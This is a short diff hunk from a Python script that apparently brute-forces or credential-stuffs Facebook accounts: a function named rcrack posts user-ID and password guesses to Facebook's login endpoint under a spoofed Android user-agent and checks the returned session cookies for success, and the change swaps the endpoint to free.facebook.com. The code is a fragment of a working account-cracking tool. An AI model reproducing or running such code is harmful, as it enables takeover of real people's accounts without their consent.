@@ -346,7 +346,7 @@ def rcrack(uid,pwx,tl):
 
              'user-agent':'Mozilla/5.0 (Linux; Android 11; Nokia 6.2 Build/RKQ1.210607.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 EdgW/1.0',}
 
-            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_mfb).text
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
 
             log_cookies=session.cookies.get_dict().keys()
 
